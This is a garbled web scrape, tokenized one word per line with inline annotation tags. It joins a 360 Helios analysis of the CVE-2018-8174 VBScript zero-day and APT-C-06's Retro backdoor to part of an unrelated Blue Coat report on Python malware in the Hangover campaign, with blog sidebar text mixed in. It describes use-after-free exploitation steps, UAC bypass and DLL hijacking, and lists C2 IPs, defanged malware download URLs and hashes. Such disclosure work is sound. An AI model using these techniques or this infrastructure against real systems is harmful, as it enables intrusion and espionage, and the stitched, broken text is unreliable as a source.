年
5
月
9
日
heliosteam

近期文章
近期文章

APT-C-06组织在全球范围内首例使
用
'
双杀
'
0day漏洞
(
CVE-2018-8174 B_malware.unknown
)
发起的APT攻击分析及溯源

Analysis
of
CVE-2018-8174 B_malware.unknown
VBScript
0day
and
APT
actor
related
to
Office
targeted
attack

Lock
.
勒索病毒分析

I
Overview

Recently
,
the
Advanced
Threat
Response
Team
of
360
Core
Security
Division
detected
an
APT
attack
exploiting
a
0-day
vulnerability
and
captured
the
world's
first
malicious
sample
that
uses
a
browser
0-day
vulnerability
.

We
code
named
the
vulnerability
as
'
double
kill
'
exploit
.

This
vulnerability
affects
the
latest
version
of
Internet
Explorer
and
applications
that
use
the
IE
kernel
.

When
users
browse
the
web
or
open
Office
documents
,
they
are
likely
to
be
potential
targets
.

Eventually
the
hackers
will
implant
backdoor
Trojan B_malware.backdoor
to
completely
control
the
computer


In
response
,
we
shared
with
Microsoft
the
relevant
details
of
the
0day
vulnerability
in
a
timely
manner
.

This
APT
attack
was
analyzed
and
attributed
upon
the
detection
and
we
now
confirmed
its
association
with
the
APT-C-06
Group
.

On
April
18
,
2018
,
as
soon
as
360
Core
Security
detected
the
malicious
activity
,
we
contacted
Microsoft
without
any
delay
and
submitted
relevant
details
to
Microsoft
.

Microsoft
confirmed
this
vulnerability
on
the
morning
of
April
20th
and
released
an
official
security
patch
on
May
8th
.

Microsoft
has
fixed
the
vulnerability
and
named
it
CVE-2018-8174 B_malware.unknown
.

After
the
vulnerability
was
properly
resolved
,
we
published
this
report
on
May
9th
,
along
with
further
technical
disclosure
of
the
attack
and
the
0day
.

II
Affection
in
China

According
to
the
sample
data
analysis
,
the
attack
affected
regions
in
China
are
mainly
distributed
in
provinces
that
actively
involved
in
foreign
trade
activities
.
Victims
include
trade
agencies
and
related
organizations
.

Save
and
Reborn
GDI
data-only
attack
from
Win32k
TypeIsolation

Save
and
Reborn
GDI
data-only
attack
from
Win32k
TypeIsolation
分类目录
分类目录

APT报告
(
2
)
web前端技术
(
4
)
人工智能
(
2
)
其他
(
4
)
内核技术
(
9
)
勒索软件
(
9
)
后台技术
(
7
)
威胁预警
(
5
)
客户端技术
(
1
)
年度报告
(
1
)
技术分享
(
2
)
服务端测试
(
2
)
木马分析
(
3
)

III
Attack
Procedure
Analysis

The
lure
documents
captured
in
this
attack
are
in
Hebrew
[
1
]

The
attackers
exploit
office
with
OLE
autolink
objects
(
CVE-2017-0199 B_malware.unknown
)
to
embed
the
documents
onto
malicious
websites
.

All
the
exploits
and
malicious
payload
were
uploaded
through
remote
servers
.

[
1
]
The
language
is
automatically
identified
by
Google
Translate

Notification
in
the
pop-up
window
:

Links
to
this
document
may
reference
other
files
.

Do
you
want
to
update
this
document
with
the
data
in
the
linked
file
?

Once
victims
opened
the
lure
document
,
Word
will
firstly
visit
a
remote
website
of
IE
vbscript
0day
(
CVE-2018-8174 B_malware.unknown
)
to
trigger
the
exploit
.

Afterwards
,
Shellcode
will
be
running
to
send
several
requests
to
get
payload
from
remote
servers
.

The
payload
will
then
be
decrypted
for
further
attack
.

未分类
(
10
)
样本分析
(
13
)
测试技术
(
1
)
漏洞分析
(
38
)
漏洞分析
(
5
)
病毒分析
(
32
)
移动端技术
(
17
)
系统研究
(
1
)
黑产研究
(
6
)
链接链接
360安全中心
360论坛

While
the
payload
is
running
,
Word
will
release
three
DLL
backdoors
locally
.

The
backdoors
will
be
installed
and
executed
through
PowerShell
and
rundll32
.

UAC
bypass
was
used
in
this
process
,
as
well
as
file
steganography
and
memory
reflection
uploading
,
in
order
to
bypass
traffic
detection
and
to
complete
loading
without
any
files
.

The
main
process
of
the
attack
is
shown
in
the
following
figure
:

IV
IE
VBScript
0day
(
CVE-2018-8174 B_malware.unknown
)

1
.
Timeline

On
April
18
,
2018
,
Advanced
Threat
Response
Team
of
360
Core
Security
Division
detected
a
high-risk
0day
vulnerabilities
.

The
vulnerability
affects
the
latest
version
of
Internet
Explorer
and
applications
that
use
the
IE
kernel
and
has
been
found
to
be
used
for
targeted
APT
attacks
.

On
the
same
day
,
360
immediately
communicated
with
Microsoft
and
submitted
details
of
the
vulnerability
to
Microsoft
.

Microsoft
confirmed
this
vulnerability
on
the
morning
of
April
20th
and
released
an
official
security
patch
on
May
8th
.

The
0day
vulnerability
was
fixed
and
it
was
named
CVE-2018-8174 B_malware.unknown
.

CVE-2018-8174 B_malware.unknown
is
a
remote
code
execution
vulnerability
of
Windows
VBScript
engine
.

Attackers
can
embed
malicious
VBScript
to
Office
document
or
website
and
then
obtain
the
credential
of
the
current
user
,
whenever
the
user
clicks
,
to
execute
arbitrary
code
.

2
.
Vulnerability
Principles

Through
the
statistical
analysis
of
the
vulnerability
samples
,
we
found
out
that
obfuscation
was
used
massively
.

Therefore
,
we
filtered
out
all
the
duplicated
obfuscation
and
renamed
all
the
identifiers
.

Seeing
from
the
POC
created
by
using
the
exploit
samples
we
captured
,
the
principles
of
the
exploit
is
obvious
.

The
POC
samples
are
as
below
:

Detailed
procedures
:

1
)
First
create
a
cla1
instance
assigned
to
b
,
and
then
assign
value
0
to
b
,
because
at
this
point
b's
referenced
count
is
1
,
causing
cla1's
Class_Terminate
function
to
be
called
.

2
)
In
the
Class_Terminate
function
,
again
assign
b
to
c
and
assign
0
to
b
to
balance
the
reference
count
.

3
)
After
the
Class_Terminate
return
,
the
memory
pointed
to
by
the
b
object
will
be
released
,
so
that
a
pointer
to
the
memory
data
of
the
released
object
b
is
obtained
.

4
)
If
you
use
another
object
to
occupy
the
freed
memory
,
it
will
lead
to
the
typical
UAF
or
Type
Confusion
problem

3
.
Exploitation

The
0-day
exploit
exploits
UAF
multiple
times
to
accomplish
type
confusion
.

It
fakes
and
overrides
the
array
object
to
perform
arbitrary
address
reading
and
writing
.

In
the
end
,
it
releases
code
to
execute
after
constructing
an
object
.

Code
execution
does
not
use
the
traditional
ROP
or
GodMod
,
but
through
the
script
layout
Shellcode
to
stabilize
the
use
.

Fake
array
to
perform
arbitrary
address
reading
and
writing

Mem
members
of
2
classes
created
by
UAF
are
offset
by
0x0c
bytes
,
and
an
array
of
0x7fffffff
size
is
forged
by
reading
and
writing
operation
to
the
two
mem
members
.

typedef
struct
tagSAFEARRAY
{

USHORT
cDims
;
/
/
cDims
=
0001

USHORT
fFeatures
;
fFeatures
=
0x0880

ULONG
cbElements
;
/
/
the
byte
occupied
by
one
element
(
1
byte
)

ULONG
cLocks
;

PVOID
pvData
;
/
/
Buffer
of
data
starts
from
0x0

SAFEARRAYBOUND
rgsabound
[
1
]
;
}
SAFEARRAY
,
*
LPSAFEARRAY
;

typedef
struct
tagSAFEARRAYBOUND
{

ULONG
cElements
;
/
/
the
number
of
elements
(
0x7fffffff
,
user
space
)

LONG
lLbound
;
/
/
the
initial
value
of
the
index
(
starting
from
0
)
}
SAFEARRAYBOUND
,
*
LPSAFEARRAYBOUND
;

A
forged
array
composes
of
a
one-dimensional
array
,
the
number
of
elements
is
7fffffff
,
each
element
occupies
1
byte
,
and
the
element
memory
address
is
0
.

So
the
accessible
memory
space
for
the
array
is
from
0x00000000
to
0x7ffffffff
*
1
.

Therefore
,
the
array
can
be
read
and
written
at
any
address
.

But
the
storage
type
of
lIlIIl
is
string
,
so
only
by
modifying
the
data
type
to
0x200C
,
i.e.
VT_VARIANT
|
VT_ARRAY
(
array
type
)
,
attackers
can
achieve
their
purpose
.

Read
the
storage
data
of
the
specified
parameter

In
the
malicious
code
,
the
above
function
is
mainly
used
to
read
the
data
of
the
memory
address
specified
by
the
parameter
.

The
idea
is
to
obtain
the
specified
memory
read
capability
via
the
characteristics
of
the
first
4
bytes
of
the
string
address
(
namely
,
the
content
of
the
bstr
,
type
,
size
field
)
returned
by
the
lenb
(
bstr
xx
)
in
the
vb
(
the
data
type
in
the
VBS
is
bstr
)
.

This
is
shown
in
the
above
code
.

If
the
input
argument
is
addr
(
0x11223344
)
,
first
add
4
to
the
value
to
get
0x11223348
,
and
then
set
the
variant
type
to
8
(
string
type
)
.

Next
,
call
len
function
:
if
found
to
be
BSTR
type
,
vbscript
will
assume
that
the
forward
4
bytes
(
0x11223344
)
is
the
address
memory
to
store
the
length
.

So
the
len
function
will
be
executed
and
the
value
of
the
specified
memory
address
will
be
returned
.

Obtain
Key
DLL
Base
Address

1
.
The
attacker
leaks
the
virtual
function
table
address
of
the
CScriptEntryPoint
object
in
the
following
way
,
which
belongs
to
Vbscript.dll
.

1
.
Obtain
the
vbscript.dll
base
address
in
the
following
way
.

1
.
Because
vbscript.dll
imported
msvcrt.dll
,
the
msvcrt.dll
base
address
was
obtained
by
traversing
the
vbscript.dll
import
table
,
msvcrt.dll
introduces
kernelbase.dll
,
ntdll.dll
,
and
finally
the
NtContinue
,
VirtualProtect
function
address
was
obtained
.

Bypass
DEP
to
execute
shellcode

1
.
Use
arbitrary
reading
and
writing
technique
to
modify
the
VAR
type
type
to
0x4d
,
and
then
assign
it
with
a
value
of
0
to
make
the
virtual
machine
perform
VAR
:
:
Clear
function
.

2
.
Control
with
caution
and
let
the
code
Execute
function
ntdll
!
ZwContinue
.

The
first
parameter
CONTEXT
structure
was
also
constructed
by
the
attacker
.

1
.
Control
the
code
with
caution
to
execute
ntdll
!
ZwContinue
function
.

The
first
parameter
CONTEXT
structure
is
also
carefully
constructed
by
the
attacker
.

1
.
The
first
parameter
of
ZwContinue
is
a
pointer
to
the
CONTEXT
structure
.

The
CONTEXT
structure
is
shown
in
the
following
figure
,
and
the
offset
of
EIP
and
ESP
in
CONTEXT
can
be
calculated
.

5
.
The
values
of
the
Eip
and
Esp
in
the
actual
runtime
CONTEXT
and
the
attacker's
intention
are
shown
in
the
figure
below
.

V
Powershell
Payload

After
the
bait
DOC
file
is
executed
,
it
will
start
to
execute
the
Powershell
command
to
the
next
step
payload
.

First
of
all
,
Powershell
will
fuzzy
match
incoming
parameter
names
,
and
it
is
case-insensitive
.

Second
step
,
decrypt
the
obfuscated
command
.

Next
,
the
script
uses
a
special
User-Agent
access
URL
page
to
request
the
next
load
and
execute
.

The
size
of
the
requested
payload
file
is
approximately
199K
.

The
code
fragment
is
as
follows
.

We
found
that
this
code
was
modified
from
invoke-ReflectivePEInjection.ps1[2]
.

buffer_x86
and
buffer_x64
in
the
code
are
same
function
but
from
different
versions
of
dll
files
.

File
export
module
name
:
ReverseMet.dll
.

https://github.com/EmpireProject/Empire/blob/master/data/module_source/code_execution/Invoke-ReflectivePEInjection.ps1 B_url.normal

DLL
file
decrypts
ip
address
,
port
and
sleep
time
from
the
configuration
.

After
the
decryption
algorithm
xor
0xA4
,
and
subtracted
0x34
,
the
code
is
as
follows
.

Decryption
configuration
file
from
the
ip
address
185.183.97.28 B_ip.unknown
port
1021
to
obtain
the
next
load
and
execute
.

After
it
connects
to
the
tcp
port
,
it
will
get
4
bytes
to
apply
for
a
memory
.

Subsequent
acquired
writes
into
the
new
thread
,
and
execute
the
acquired
shellcode
payload
.

Since
the
port
of
the
sample
CC
server
is
closed
,
we
cannot
get
the
next
load
for
analysis
.

VI
UAC
Bypass
Payload

In
addition
to
use
PowerShell
to
load
the
payload
,
the
bait
DOC
file
also
runs
rundll32.exe B_malware.normal
to
execute
another
backdoor
locally
.

There
are
several
notable
features
of
the
backdoor
program
it
uses
:
the
program
uses
COM
port
to
copy
files
,
realize
UAC
bypass
and
two
system
DLL
hijacks;
it
also
uses
the
default

DLLs
of
cliconfg.exe B_malware.normal
and
SearchProtocolHost.exe B_malware.normal
to
take
advantage
of
whitelist;
finally
in
the
process
of
component
delivery
,
use
file
steganography
and
memory
reflection
loading
method
to
avoid
traffic
monitoring
and
achieve
no
file
landing
load
.

1
.
Retro B_malware.backdoor
backdoor
execution

The
backdoor
program
used
in
this
attack
is
actually
the
Retro B_malware.backdoor
series
backdoor
known
to
be
used
by
the
APT-C-06
organization
.

The
following
is
a
detailed
analysis
of
the
implementation
process
of
the
backdoor
program
.

First
execute
the
DLL
disguised
as
a
zlib
library
function
with
rundll32
and
execute
the
backdoor
installation
functions
uncompress2
and
uncompress3
.

It
uses
a
COM
port
for
UAC
bypass
,
copying
its
own
DLL
to
the
System32
path
for
DLL
hijacking
,
and
the
hijacked
targets
are
cliconfg.exe B_malware.normal
and
SearchProtocolHost.exe B_malware.normal
.

Copy
the
DLL
file
in
the
AppData
directory
to
the
System32
directory
through
the
COM
interface
and
name
it
msfte.dll
and
NTWDBLIB.dll
.

Then
copy
the
file
NTWDBLIB.dll
to
the
System
directory
and
execute
the
system's
own
cliconfig
to
achieve
DLL
hijacking
and
load
NTWDBLIB.dll
.

The
role
of
NTWDBLIB.dll
is
to
restart
the
system
service
WSearch
,
and
then
start
msfte.dll
.

The
script
will
then
generate
and
execute
the
MO4TH2H0.bat
file
in
the
TEMP
directory
,
which
will
delete
the
NTWDBLIB.DLL
and
its
own
BAT
from
the
system
directory
.

Msfte.dll B_malware.backdoor
is
the
final
backdoor
program
whose
export
is
disguised
as
zlib
.

The
core
export
functions
are
AccessDebugTracer
and
AccessRetailTracer
.

Its
main
function
is
to
communicate
with
CC
and
further
download
and
execute
subsequent
DLL
programs
.

Similar
to
the
previously
analyzed
sample
,
it
is
also
using
image
steganography
and
memory
reflection
loading
.

The
decrypted
CC
communication
information
is
as
follows
:

The
format
of
the
request
is
:

Hxxp://CC_Address/s7/config.php?p=M&inst=7917&name= B_url.cncsvr

Among
them
,
the
parameter
p
is
the
current
process
authority
,
there
are
two
types
of
M
and
H
,
inst
parameter
is
the
current
installation
id
,
name
is
the
CC_name
obtained
by
decryption
,
this
time
is
pphp
.

After
decryption
after
downloading
,
the
process
is
exactly
the
same
as
the
format
of
the
previous
image
steganography
transmission
.

The
decryption
process
this
time
is
shown
in
the
figure
below
:

The
previously
decrypted
test
sample
decryption
process
is
shown
below
:

For
the
CC
URL
corresponding
to
the
test
request
,
because
we
did
not
obtain
the
corresponding
image
during
the
analysis
,
the
CC
is
suspected
to
have
failed
.

In
the
implementation
process
,
Retro B_malware.backdoor
disguised
fake
SSH
and
fake
zlib
,
intended
to
obfuscate
and
interfere
with
users
and
analysts
.

Retro's
attack
method
has
been
used
since
2016
.

2
.
Retro B_malware.backdoor
backdoor
evolvement

The
back
door
program
used
in
the
APT-C-06
organization's
early
APT
operation
was
Lucker B_malware.backdoor
.

It
is
a
set
of
self-developed
and
customized
modular
Trojans B_malware.backdoor
.

The
set
of
Trojans B_malware.backdoor
is
powerful
,
with
keyboard
recording
,
voice
recording
,
screen
capture
,
file
capture
and
U
disk
operation
functions
,
etc
.

The
Lucker B_malware.backdoor
'
s
name
comes
from
the
PDB
path
of
this
type
of
Trojan B_malware.backdoor
,
because
most
of
the
backdoor's
function
use
the
LK
abbreviation
.

In
the
middle
to
late
period
we
have
discovered
its
evolution
and
two
different
types
of
backdoor
programs
.

We
have
named
them
Retro B_malware.backdoor
and
Collector B_malware.backdoor
by
the
PDB
path
extracted
from
the
program
.

The
Retro B_malware.backdoor
backdoor
is
an
evolution
of
the
Lucker B_malware.backdoor
backdoor
and
it
actives
in
a
series
of
attacks
from
2016
till
now
.

The
name
comes
from
the
pdb
path
of
this
type
of
Trojan B_malware.backdoor
with
the
label
Retro B_malware.backdoor
,
and
also
has
the
word
Retro B_malware.backdoor
in
the
initial
installer
.

C:\workspace\Retro\DLL-injected-explorer\zlib1.pdb

C:\workspace\Retro\RetroDLL\zlib1.pdb

The
evolution
of
the
reflective
DLL
injection
technique
can
be
found
from
the
relevant
PDB
paths
,
and
there
are
a
lot
of
variants
of
this
series
of
backdoors
.

VII
Attribution

1
.
Decryption
Algorithm

During
the
analysis
,
we
found
the
decryption
algorithm
that
malware
used
is
identical
to
APT-C-06's
decryption
algorithm
.

The
decryption
algorithm
of
this
attack
is
as
follow
:

The
decryption
algorithm
APT-C-06
used
is
as
follow
:

In
the
further
analysis
,
we
found
the
same
decryption
algorithm
was
used
in
the
64-bit
version
of
the
relevant
malware
.

2
.
PDB
Path

The
PDB
path
of
the
malware
used
in
this
attack
has
a
string
of
'
Retro B_malware.backdoor
'
.

It
is
one
specific
feature
of
Retro B_malware.backdoor
Trojan B_malware.backdoor
family
.

3
.
Victims

In
the
process
of
tracing
victims
,
we
found
one
special
compromised
machine
.

It
has
a
large
amount
of
malware
related
to
APT-C-06
.

By
looking
at
these
samples
in
chronological
order
,
the
evolution
of
the
malicious
program
can
be
clearly
seen
.

The
victim
has
been
under
constant
attack
acted
by
APT-C-06
since
2015
.

The
early
samples
on
the
compromised
machine
could
be
associated
with
DarkHotel
.

Then
it
was
attacked
by
Lurker B_malware.backdoor
Trojan B_malware.backdoor
.

Recently
it
was
under
the
attack
exploiting
0-day
vulnerabilities
CVE-2018-8174 B_malware.unknown
.

VIII
Conclusion

APT-C-06
is
an
overseas
APT
organization
which
has
been
active
for
a
long
time
.

Its
main
targets
are
China
and
some
other
countries
.

Its
main
purpose
is
to
steal
sensitive
data
and
conduct
cyber-espionage
.

DarkHotel
can
be
regarded
as
one
of
its
series
of
attack
activities
.

The
attacks
against
China
specifically
targeted
government
,
scientific
research
institutions
and
some
particular
field
.

The
attacks
can
be
dated
back
to
2007
and
are
still
very
active
.

Based
on
the
evidence
we
have
,
the
organization
may
be
a
hacker
group
or
intelligence
agency
supported
by
a
foreign
government
.

The
attacks
against
China
have
never
stopped
over
the
past
10
years
.

The
Techniques
the
group
uses
keep
evolving
through
time
.

Based
on
the
data
we
captured
in
2017
,
targets
in
China
are
trade
related
institutions
and
concentrated
in
provinces
that
have
frequent
trading
activities
.

The
group
has
been
conducting
long-term
monitoring
on
the
targets
to
stole
confidential
data
.

During
the
decades
of
cyber
attacks
,
APT-C-06
exploits
several
0-day
vulnerabilities
and
used
complicated
malware
.

It
has
dozens
of
function
modules
and
over
200
malicious
codes
.

In
April
,
2018
,
the
Advanced
Threat
Response
Team
of
360
Core
Security
Division
takes
the
lead
in
capturing
the
group's
new
APT
attack
using
0-day
vulnerabilities
(
CVE-2018-8174 B_malware.unknown
)
in
the
wild
,
and
then
discovers
the
new
type
attack
–
Office
related
attack
exploiting
0-day
VBScript
vulnerabilities
.

After
the
capture
of
the
new
activity
,
we
contacted
Microsoft
immediately
and
shared
detailed
information
with
them
.

Microsoft's
official
security
patch
was
released
on
8th
May
.

Now
,
we
published
this
detailed
report
to
disclose
and
analyze
the
attack
.

Appendix
IOC

References
https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-20188174 B_url.normal

About

360
Helios
Team
is
the
APT
(
Advanced
Persistent
Attack
)
research
and
analysis
team
in
Qihoo
360
.

The
team
is
dedicated
in
APT
attack
investigation
,
threat
incident
response
and
underground
economy
industrial
chain
studies
.

Since
the
establishment
in
December
,
2014
,
the
team
has
successflly
integrated
360's
big
data
base
and
built
up
a
quick
reversing
and
corellation
procudure
.

So
far
,
more
than
30
APT
and
underground
economy
groups
have
been
discovered
and
revealed
.

360
Helios
also
provides
threat
intelligence
assessment
and
response
solutions
for
enterprises
.

Contact
:
360zhuiri@360.cn

Posted
in
:
未分类
←
Lock
.
勒索病毒分析

APT-C-06组织在全球范围内首例使用'双杀'0day
漏洞(CVE-2018-8174)发起的APT攻击分析及溯
发表评论
发表评论
电子邮件地址不会被公开。
必填项已用*标注
评论评论

姓名姓名
*
电子邮件
*
电子邮件
站点站点
发表评论

Copyright
©
2018
奇虎360技术博客
—
Primer
WordPress
theme
by
GoDaddy
Snake
In
The
Grass
:
Python-based
Malware
Used
For
Targeted
Attacks

bluecoat.com/security-blog/2014-06-10/snake-grass-python-based-malware-used-targeted-attacks B_url.normal

Researchers
at
Blue
Coat
Systems
have
identified
an
intelligence-gathering
campaign
related
to
the
Hangover
operation
detailed
in
2013
.

The
targets
of
this
operation
appear
to
be
Pakistani
and
presumably
represent
military
interests
.

The
malware
used
for
this
is
very
simple
,
but
uses
a
little
used
format
.

Instead
of
the
programming
languages
most
commonly
used
for
malware
creation
,
the
actors
have
turned
to
using
Python
,
a
powerful
scripting
language
.

The
scripts
were
found
embedded
inside
regular
executable
files
designed
to
run
Python
scripts
without
having
to
install
the
full
Python
package
.

The
inclusion
of
malicious
scripting
code
in
relatively
mainstream
installers
is
probably
done
to
avoid
antivirus
detections
,
and
regular
AV
detection
rates
on
these
executables
tend
to
be
quite
low
.

However
,
BlueCoat
Malware
Analysis
Appliance
proactively
detects
these
malwares
with
a
high
risk
score
.

Several
indicators
point
towards
the
same
attackers
as
were
detailed
in
the
Norman
Shark
(
now
part
of
Blue
Coat
Systems
)
Hangover
report
from
last
year
.

This
campaign
is
not
the
first
sign
of
life
from
these
actors
after
we
published
our
report
–
there
have
been
several
smaller
initiatives
during
the
autumn
of
2013
.

Initial
malware

The
initial
installers
of
this
campaign
were
discovered
due
to
behavior
similarities
with
previous
Hangover-related
malware
.

These
appear
to
have
been
prepared
for
email
distribution
or
possibly
for
web
download
.

Four
such
installers
were
identified;
files
with
the
MD5
hash
of
:

0392fb51816dd9583f9cb206a2cf02d9 B_hash
,
(
original
name
Brief
DG
Arty-8
30
Aug.scr
)

e6d9fce2c6e766b0899ac2e1691b8097 B_hash
,
(
original
name
Debriefing
Indian
Missile
Def
Prg.scr
)

e013691e702778fa6dbc35b15555c3c2 B_hash
,
(
original
name
HQ
Div
Sp
Eqs
21
Dec
2013
final.scr
)

9d299d3a074f2809985e0317b9c461eb B_hash
,
(
original
name
HQ
19
div
CTGY
PLAN-Offn
Objs.scr
)

These
are
all
self-extracting
archives
(
WinRAR
SFX
RAR
and
SFX
ZIP
)
,
which
again
contain
lure
documents
and
a
malicious
Python
installer
.

0392fb51816dd9583f9cb206a2cf02d9 B_hash
:

These
files
are
all
created
using
the
PyInstaller
tool
.

The
'
archive-viewer.py
'
Python
script
provided
with
the
PyInstaller
package
can
be
used
to
examine
these
installers
:

Most
of
the
objects
in
these
packages
are
legitimate
libraries
and
components
required
by
the
installer
itself
.

The
highlighted
'
send
'
object
is
where
the
malicious
Python
script
resides
.

And
,
as
Python
is
a
human-readable
format
,
this
makes
analysis
straightforward
:

Python
function
made
for
testing
connection
to
Command
&
Control
servers
.

Note
how
worldvoicetrip[.]com B_url.cncsvr
can
supply
a
new
C&C
server
(
'
code4
'
)
in
domain.html
.

There
are
two
main
functionalities
for
these
scripts
:

Harvest
system
information
using
existing
system
tools
like
systeminfo.exe B_malware.normal
.

This
information
is
attempted
uploaded
to
Command
&
Control
(
C&C
)
server
.

Download
and
execute
more
malicious
executables
.

Decoy
documents

The
documents
accompanying
the
malware
executables
seem
all
related
to
Indian
military
matters
.

The
excerpt
below
is
labeled
confidential;
however
the
text
is
taken
from
a
publicly
available
source
at
armscontrol.org B_url.normal
.

(
https://www.armscontrol.org/act/2013_01-02/Indian-Missile-Defense-Program-Advances B_url.normal
)

This
document
contains
references
to
Artillery
Firing
Data
Computing
Devices
(
AFDCD's
)
,
which
are
given
to
be
Casio
FX-750
and
Casio
FX-880-P
.

However
,
these
are
models
of
handheld
calculators
from
30
years
ago
.

They
are
not
used
for
military
purposes
today
.

At
least
,
I
hope
not
.

Case
expansion

Case
expansion
is
the
process
of
mapping
out
connections
with
other
cases
and
malwares
to
understand
the
larger
threat
picture
.

This
gives
information
about

what
activities
are
ongoing

against
whom

using
what
tools

and
how
to
mitigate

This
process
involves
multiple
iterations
of
pivoting
by
a
great
deal
of
possible
parameters
–
similarities
in
malware
,
similarities
in
network
traffic
,
various
domain
registration
and
hosting
information
,
passive
DNS
data
etc
.

We
begin
with
the
beginning
–
what
we
can
learn
from
the
initial
malware
files
.

Command
&
Control
–
hosted
malware

As
shown
previously
,
the
C&C
servers
used
in
these
malwares
were
:
games-playbox[.]com B_url.cncsvr
worldvoicetrip[.]com B_url.cncsvr

The
latter
server
was
down
by
the
time
we
noticed
the
malware
,
but
games-playbox[.]com B_url.cncsvr
still
resolved
to
the
IP
176.56.238.177 B_ip.cncsvr
,
belonging
to
AS198203
ASN-ROUTELABEL
RouteLabel
V
.
O
.
F
.
in
the
Netherlands
.

Internal
and
public
databases
show
that
this
server
has
been
hosting
malware
for
download
:
hxxp://games-playbox[.]com/testing1/download/reg.exe B_url.cncsvr
hxxp://176.56.238.177/testing2/download/reg.exe B_url.cncsvr
hxxp://176.56.238.177/testing2/download/reg1.exe B_url.cncsvr
hxxp://176.56.238.177/testing4/download/reg.exe B_url.cncsvr
hxxp://176.56.238.177/testing2/download/winrm.exe B_url.cncsvr
hxxp://176.56.238.177/testing2/download/sppsvc.exe B_url.cncsvr
hxxp://games-playbox[.]com/winone1/download/stisvc.exe B_url.cncsvr
hxxp://games-playbox[.]com/winone1/download/sppsvc.exe B_url.cncsvr

Brute
force
testing
showed
that
at
least
subfolders
winone2
,
winone3
and
winone4
contained
similar
content
as
winone1
.

reg.exe B_malware.unknown
,
reg1.exe B_malware.unknown
:

These
are
MINGW32
C++
(
not
Python
)
executables
which
have
only
one
function
–
to
insert
a
registry
key
that
allows
other
malware
to
be
run
on
startup
.

For
example
,
the
executable
reg.exe
(
05dc62dcd4ddc9f2a79c5d23647c25c2 B_hash
)
creates
the
key
:

HKCU\Software\Microsoft\Windows\CurrentVersion\Run
Search=C:\dir2\CscService.exe

This
separation
of
functions
is
likely
done
to
avoid
detection
logic
that
triggers
on
software
that
inserts
itself
into
such
run
keys
.

winrm.exe B_malware.infosteal
,
stisvc.exe B_malware.infosteal
:

This
executable
is
a
data
stealer
,
which
enumerates
folders
and
harvests
files
of
format
doc
,
xls
,
ppt
,
pps
,
inp
,
pdf
,
xlsx
,
docx
,
pptx
.

sppsvc.exe B_malware.unknown
:

This
is
a
keylogger
,
which
hooks
keyboard
and
mouse
events
.

In
connection
with
these
findings
we
found
that
the
same
Python
functionality
was
sometimes
embedded
in
executable
files
of
a
slightly
different
format
–
namely
py2exe
.

These
files
have
a
different
internal
structure
than
PyInstallers
,
but
the
embedded
scripts
can
be
extracted
and
decoded
using
the
Python
module
uncompyle2
.

Passive
DNS
analysis
shows
that
games-playbox[.]com B_url.cncsvr
has
shared
IP
address
with
other
suspicious
domains
:

Rdata
results
for
ANY
/
176.56.238.177 B_ip.cncsvr
techto-earth[.]com B_url.cncsvr
.
A
176.56.238.177 B_ip.cncsvr
games-playbox[.]com B_url.cncsvr
.

A
176.56.238.177 B_ip.cncsvr
download-mgrwin[.]com B_url.cncsvr
.

A
176.56.238.177 B_ip.cncsvr

Indeed
,
techto-earth[.]com B_url.cncsvr
shows
up
in
Google
with
an
entry
on
the
URL
checking
service
URLQuery[.]net
.

This
download
link
(
hxxp://techto-earth[.]com/eastwing/download/sppsvc.exe B_url.cncsvr
)
was
at
the
point
of
writing
live
,
and
the
downloaded
executable
(
md5
c571b77469ad3c5ef336860605ee85c6 B_hash
)
was
verified
as
a
PyInstaller-based
malware
.

Brute
force
attempts
showed
that
this
folder
also
contained
stisvc.exe B_malware.unknown
(
md5
f2a1ca02bf4a63a3d4a6c6464f5a925b B_hash
)
and
reg.exe B_malware.unknown
;
these
have
same
functionality
as
the
identically
named
executables
found
on
games-playbox[.]com B_url.cncsvr
.

The
techto-earth[.]com B_url.cncsvr
domain
now
resolved
to
the
IP
address
81.4.125.90 B_ip.cncsvr
,
similarly
belonging
to
the
Dutch
provider
RouteLabel
.

The
domain
download-mgrwin[.]com B_url.cncsvr
which
shared
the
IP
81.4.125.90 B_ip.cncsvr
with
techto-earth[.]com B_url.cncsvr
was
also
found
to
host
similar
malware
:
hxxp://download-mgrwin[.]com/southside/download1/stisvc.exe B_url.cncsvr
md5
6ec82e9eccb9bee050c9f7f2750d0c7c B_hash

hxxp://download-mgrwin[.]com/southside/download1/sppsvc.exe B_url.cncsvr
md5
acfada8e91eda6cca2da66bbb032d924 B_hash

hxxp://download-mgrwin[.]com/eastside/download/sppsvc.exe B_url.cncsvr
md5
6dc9eee24f8d5cba1ca3919b87507d86 B_hash

'
Nick
Agroyes
'

Domain
registration
information
is
useful
for
connecting
cases
.

Though
often
falsified
,
reuse
of
the
same
registrant
information
is
common
,
thus
providing
a
way
of
linking
different
domains
.

download-mgrwin[.]com B_url.cncsvr
was
registered
on
the
email
address
info
@
communication-principals[.]com B_url.unknown
,
purportedly
belonging
to
one
Nick
Agroyes
:

This
is
a
faked
record
,
but
the
same
address
was
used
to
register
other
domains
of
which
some
have
been
documented
used
by
malware
-
alertmymailsnotify[.]com B_url.unknown
,
communication-principals[.]com B_url.unknown
,
servicesprocessing[.]com B_url.unknown
and
websourceing[.]com B_url.unknown
.
communication-principals[.]com B_url.unknown
:
md5
:
664f32f06dd7bd8c94df6edfcf6285da B_hash

This
is
an
exploited
RTF
file
leveraging
the
CVE-2012-0158 B_malware.drop
RTF
vulnerability
which
downloads
a
file
from
hxxp://communication-principals[.]com/vargualm12/putty.exe B_url.unknown

servicesprocessing[.]com B_url.unknown
:

VirusTotal
shows
a
number
of
links
to
malicious
executables
on
this
domain
.

hxxp://servicesprocessing[.]com/naspckn/plugins/wsutils.exe B_url.unknown

hxxp://servicesprocessing[.]com/naspckn/plugins/shlwapi.exe B_url.unknown

hxxp://servicesprocessing[.]com/panomasi/plugins/shlwapi.exe B_url.unknown
:
md5
eeaf96b1988c7016780c0d91ce2451c8 B_hash

hxxp://servicesprocessing[.]com/panomasi/plugins/wsutils.exe B_url.unknown
:
md5
4a9a912a8610495029ef3df813272d8a B_hash

Other
registrants

The
file
4a9a912a8610495029ef3df813272d8a B_hash
has
also
been
hosted
elsewhere
,
on
alertmymail[.]com B_url.unknown
:
hxxp://alertmymail[.]com/lotopoto07/plugins/wsutils.exe B_url.unknown

This
domain
is
registered
on
the
registrant
sakanika
@
rediffmail[.]com B_url.unknown
.

Other
domains
owned
by
this
entity
are
necessaries-documentation[.]com B_url.unknown
and
accountsloginmail-process[.]com B_url.unknown
which
show
pDNS
overlap
